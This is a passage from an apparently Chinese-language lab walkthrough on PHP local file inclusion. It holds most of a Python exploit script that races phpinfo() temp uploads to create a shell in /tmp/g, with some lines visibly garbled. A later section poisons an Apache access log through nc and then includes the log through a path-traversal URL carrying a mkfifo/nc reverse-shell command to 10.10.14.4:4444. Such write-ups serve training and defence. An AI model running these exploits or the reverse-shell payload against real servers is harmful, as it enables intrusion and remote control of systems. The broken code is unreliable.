    Proxy-Connection: Keep-Alive\r
    Host: %s\r
    \r
    \r
    """
        return (REQ1, TAG, LFIREQ)
    def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s2.connect((host, port))
        s.send(phpinforeq)
        d = ""
        while len(d) = self.maxattempts:
                        return
                    counter+=1
                try:
                    x = phpInfoLFI(*self.args)
                    if self.event.is_set():
                        break
                    if x:
                        print "\nGot it! Shell created in /tmp/g"
                        self.event.set()
                except socket.error:
                    return
    def getOffset(host, port, phpinforeq):
        """Gets offset of tmp_name in the php output"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        s.send(phpinforeq)
        d = ""
        while True:
            i = s.recv(4096)
            d+=i
            if i == "":
                break
            # detect the final chunk
            if i.endswith("0\r\n\r\n"):
                break
        s.close()
        i = d.find("[tmp_name] =&gt")
        if i == -1:
            raise ValueError("No php tmp_name in phpinfo output")
        print "found %s at %i" % (d[i:i+10],i)
        # padded up a bit
        return i+256
    def main():
        print "LFI With PHPInfo()"
        print "-=" * 30
        if len(sys.argv) = maxattempts:
                        break
            print
            if e.is_set():
                print "Woot!  \m/"
            else:
                print ":("
        except KeyboardInterrupt:
            print "\nTelling threads to shutdown..."
            e.set()
        print "Shuttin' down..."
        for t in tp:
            t.join()
    if __name__=="__main__":
        print "Don't forget to modify the LFI URL"
        main()
#### apache log getshell
我们可以通过日志文件记录php shell的内容，然后包含该内容，成功getshell
首先我们能够包含到/var/log/httpd-access.log文件
然后通过nc构造一句话访问网站
    $ nc -vn 10.10.10.84 80
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Connected to 10.10.10.84:80.
    HTTP/1.1 400 Bad Request
    Date: Tue, 14 May 2019 09:50:29 GMT
    Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
    Content-Length: 226
    Connection: close
    Content-Type: text/html; charset=iso-8859-1
    400 Bad Request
    Bad Request
    Your browser sent a request that this server could not understand.
这里为什么要用nc去访问，不用这样的方式去访问，因为日志在存储的过程中会把符号转换成编码的形式，然后就无法产生一句话了。
最后我们包含日志文件成功反弹shell
    http://10.10.10.84/browse.php?file=../../../../../../../../var/log/httpd-access.log&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.4+4444+%3E/tmp/f
参考：  